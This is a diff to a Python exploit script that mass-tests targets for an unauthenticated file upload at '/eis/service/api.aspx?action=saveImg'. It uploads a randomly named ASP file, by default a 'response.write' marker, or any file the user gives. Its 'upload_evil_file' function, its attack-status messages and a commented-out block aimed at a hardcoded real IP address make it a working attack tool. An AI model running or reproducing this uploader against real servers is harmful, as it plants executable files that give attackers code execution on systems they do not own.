@@ -15,17 +15,36 @@ proxies = None
 timeout = None
 delay = None
 thread = None
-DEFAULT_USER_AGENT = "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
+DEFAULT_USER_AGENT = 'Mozilla/5.0.html (Windows NT 6.1; WOW64; rv:34.0.html) Gecko/20100101 Firefox/34.0.html'
 MIN_VARIABLE_NUM = 1
 MAX_VARIABLE_NUM = 10
 MAX_LENGTH = 10
 BACK_PATH = list()
 
+# fileObject = {'file': ('RqxyOY9.asp', b'<% response.write("ASuDhtpoO") %>', 'Content-Type: text/html')}
+# attack_url = "/eis/service/api.aspx?action=saveImg"
+# with open('../urls.txt', 'r') as f:
+#     # urls = f.read().split()
+#     urls = ["http://218.17.53.26:8171"]
+#     for url in urls:
+#         _url = url[:-1] if url.endswith("/") else url
+#         print(f"[+] test {_url} ...")
+#         try:
+#             req = requests.post(url + attack_url, headers=None, files=fileObject, proxies=proxies, timeout=(5, 10))
+#             print(url + attack_url, headers, fileObject, proxies)
+#             if req.status_code < 300:
+#                 print(req.status_code, _url)
+#                 print(req.content.decode(req.encoding))
+#                 break
+#         except Exception as e:
+#             print(e.args.__str__())
+#             continue
+
 
 def _post_request(url: str, file: dict, headers: dict = None) -> (int, requests.Response or str):
     global proxies
     try:
-        res =requests.post(url, headers=headers, files=file, proxies=proxies)
+        res = requests.post(url, headers=headers, files=file, proxies=proxies, timeout=(5, 10))
         return 200, res
     except Exception as e:
         return 500, f"[!]Unable to access {url} normally, due to{e.args.__str__()}"
@@ -56,15 +75,16 @@ def _get_content(o: requests.Response, encoding: str = "UTF-8") -> str:
 
 
 def upload_evil_file(url: str, attack_url: str, headers: dict = None, o: str = None, _type: str = "asp"):
+    print(f"[*]正在尝试攻击{url}...")
     url = url[:-1] if url.endswith("/") else url
-    content = o.encode()
     _value, _ = create_random_variable_name(create_random_variable_length(), is_value=True)
     fileObject = {
-        'file': (f"{_value}.{_type}", content,
+        'file': (f"{_value}.{_type}", o.encode(),
                  "Content-Type: text/html")
     }
     code, res = _post_request(url + attack_url, file=fileObject, headers=headers)
     if code != 200:
+        print(res)
         return
     # print(res.content)
     print(f"[+]{url + _get_content(res)}")
@@ -90,7 +110,6 @@ def set_cmd_arg() -> any:
 
     upload = parser.add_mutually_exclusive_group(required=False)
     upload.add_argument('--upload', type=str, help='Enter the filepath')
-    upload.add_argument("--content", type=str, help='write the content by yourself')
 
     useragent = parser.add_mutually_exclusive_group(required=False)
     useragent.add_argument('--random-agent', type=bool, help='Using random user agents')
@@ -116,22 +135,12 @@ def parse_cmd_args(args) -> dict:
 
     _value = f"""<% response.write("{(create_random_variable_name(create_random_variable_length(), is_value=True))[0]}") %>"""
 
-    if args.content is None and args.upload is None:
+    if not args.upload:
         o.setdefault('content', {'type': 'str',
                                  'value': _value})
-
-    if args.content is not None:
-        if not args.content:
-            o.setdefault('content', {'type': 'str',
-                                     'value': _value})
-        else:
-            o.setdefault('content', {'type': 'str', 'value': args.content})
+        print(f"[!]尝试执行payload:{_value}")
     else:
-        if not args.upload:
-            o.setdefault('content', {'type': 'str',
-                                     'value': _value})
-        else:
-            o.setdefault('content', {'type': 'file', 'value': args.upload})
+        o.setdefault('content', {'type': 'file', 'value': args.upload})
 
     options = dict()
     if args.random_agent is not None and args.random_agent:
@@ -186,6 +195,7 @@ def parse_param(o: dict) -> (list, str, str):
     timeout = options.get('time_out', 0)
     delay = options.get('delay', 0)
     thread = options.get('thread', 1)
+
     return urls, payload, _type
 
 
@@ -225,7 +235,7 @@ def get_data_from_file(filename: str, mode: str) -> tuple:
         if code != 200:
             return code, content
         with open(filename, mode=mode) as f:
-            content = f.read().split()
+            content = f.read().split("\n")
         return 200, content
     except Exception as e:
         return 200, f"[!]Unexpected error occurred during file processing while opening {filename}"
